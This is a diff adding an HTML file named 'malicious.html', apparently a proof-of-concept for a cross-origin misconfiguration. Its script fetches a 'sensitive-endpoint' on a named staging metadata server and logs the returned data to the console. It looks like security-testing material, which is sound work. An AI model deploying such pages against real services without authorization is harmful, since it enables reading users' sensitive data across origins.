@@ -1,0 +1,17 @@
+<!-- malicious.html -->
+<html>
+<body>
+    <script>
+        // Make a request to the target server
+        fetch('https://metadata.stage.guildofguardians.com/sensitive-endpoint', {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        })
+        .then(response => response.json())
+        .then(data => console.log('Data:', data))
+        .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
